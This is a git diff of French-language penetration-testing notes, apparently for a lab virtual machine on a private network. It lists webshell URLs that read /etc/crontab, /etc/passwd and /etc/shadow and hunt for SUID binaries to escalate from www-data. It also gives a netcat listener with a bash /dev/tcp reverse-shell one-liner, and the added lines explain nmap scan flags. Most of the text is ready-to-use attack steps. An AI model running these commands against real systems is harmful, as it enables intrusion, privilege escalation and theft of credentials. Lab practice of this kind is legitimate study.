@@ -64,9 +64,9 @@ pwd: Entrée (le bouton)
 # faire passer www-data à un utilisateur privilégié
 
 # mettre ceci dans le navigateur:
-- http://192.168.1.26/files/simple_shell.php?cmd=cat%20/etc/crontab
-- http://192.168.1.26/files/simple_shell.php?cmd=find%20/%20-perm%20-u=s%20-type%20f%202%3E/dev/null
-- http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
+- http://192.168.1.8/files/simple_shell.php?cmd=cat%20/etc/crontab
+- http://192.168.1.8/files/simple_shell.php?cmd=find%20/%20-perm%20-u=s%20-type%20f%202%3E/dev/null
+- http://192.168.1.8/files/webshell.php?cmd=cat%20/etc/passwd
 - http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
 - http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz
 
@@ -79,6 +79,11 @@ not yet
 # localhost 
 - nc -lvp 4444
 - bash -c 'bash -i >& /dev/tcp/<TON_IP>/4444 0>&1'
+
+# nmap -sV -sC -O 192.168.1.8
+- -sV : Détecte les versions des services en cours d'exécution.
+- -sC : Utilise des scripts Nmap pour détecter des vulnérabilités connues.
+- -O : Détermine le système d’exploitation (si possible).
 
 # developer
 - Prénom NOM: Mouhamed DIOUF
